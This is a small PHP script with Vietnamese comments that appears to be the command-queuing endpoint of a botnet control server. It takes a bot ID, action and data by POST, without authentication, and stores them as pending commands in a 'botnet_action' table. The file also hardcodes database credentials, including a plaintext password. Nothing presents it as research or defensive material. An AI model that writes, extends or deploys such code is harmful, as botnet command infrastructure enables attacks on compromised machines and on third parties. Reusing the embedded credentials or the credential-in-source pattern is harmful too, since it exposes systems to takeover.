<?php

$servername = "localhost";
$username = "ailurophile"; // thay đổi với username của bạn
$password = "Dinokulz123."; // thay đổi với mật khẩu của bạn
$dbname = "ailurophile"; // thay đổi với tên database của bạn

try {
    $pdo = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Kết nối thất bại: " . $e->getMessage());
}

// Kiểm tra nếu có request POST với các tham số cần thiết
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['botnet_bot_id'], $_POST['action'], $_POST['data'])) {
    $botnetBotId = $_POST['botnet_bot_id'];
    $action = $_POST['action'];
    $data = $_POST['data'];

    // Chèn dữ liệu vào bảng botnet_action với status là 'init'
    $stmt = $pdo->prepare("INSERT INTO botnet_action (botnet_bot_id, action, data, status) VALUES (:botnet_bot_id, :action, :data, 'init')");
    $stmt->execute([
        'botnet_bot_id' => $botnetBotId,
        'action' => $action,
        'data' => $data
    ]);

    echo json_encode(["msg" => "success", "details" => "Action inserted successfully"]);
} else {
    echo json_encode(["msg" => "error", "details" => "Invalid request or missing parameters"]);
}
